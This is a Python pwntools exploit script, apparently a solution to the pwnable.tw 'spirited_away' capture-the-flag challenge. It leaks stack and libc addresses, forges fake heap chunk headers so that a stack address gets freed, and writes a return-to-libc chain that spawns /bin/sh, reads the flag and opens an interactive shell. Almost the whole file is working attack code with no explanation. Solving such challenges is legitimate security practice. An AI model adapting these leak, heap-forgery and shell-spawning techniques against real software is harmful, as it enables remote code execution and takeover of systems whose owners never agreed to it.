import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./spirited_away')
	elf=ELF('./spirited_away')
	libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
else :
	io=remote('chall.pwnable.tw',10204)
	elf=ELF('./spirited_away')
	libc=ELF('./libc_32.so.6')

def add(a,b,c,d):
	sleep(0.1)
	io.sendafter('Please enter your name: ',a)
	io.sendlineafter('Please enter your age: ',str(b))
	io.sendafter('Why did you came to see this movie? ',c)
	io.sendafter('Please enter your comment: ',d)
	io.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

io.sendafter('Please enter your name: ','1')
io.sendlineafter('Please enter your age: ','12')
io.sendafter('Why did you came to see this movie? ','a'*56)
io.sendafter('Please enter your comment: ','b'*1)
io.recvuntil('a'*56)
stack_addr=u32(io.recv(4))
io.recv(4)
libc_base=u32(io.recv(4))-libc.symbols['fflush'] - 11
success('libc_base:'+hex(libc_base))
success('stack_addr:'+hex(stack_addr))
io.sendafter('Would you like to leave another comment? <y/n>: ', 'y')
for i in range(9):
	add('s',12,'a'*1,'b'*1)
for i in range(90):
    io.sendafter('Please enter your age: ', '1\n')
    io.sendafter('Why did you came to see this movie? ', 'c\0')
    io.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

io.sendafter('Please enter your name: ', 'a\0')
io.sendafter('Please enter your age: ', '1\n')
io.sendafter('Why did you came to see this movie? ', 'g' * 8 + p32(0) + p32(0x41) + 'f' * 0x38 + p32(0) + p32(0x11))
io.sendafter('Please enter your comment: ', 'e' * 72 + p32(0) + p32(0) + p32(1) + p32(stack_addr - 0x60))
io.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

pay=p32(0)+p32(libc_base+libc.sym['system'])+p32(libc_base+libc.sym['exit'])+p32(libc_base+libc.search('/bin/sh\x00').next())

io.sendafter('Please enter your name: ', 'z' * 64 + pay)
io.sendafter('Please enter your age: ', '1\n')
io.sendafter('Why did you came to see this movie? ', 'c\0')
io.sendafter('Please enter your comment: ', 'd\0')
io.sendafter('Would you like to leave another comment? <y/n>: ', 'n')
io.sendline('cat /home/spirited_away/flag')
print io.recv()
#gdb.attach(io)
#pause()
io.interactive()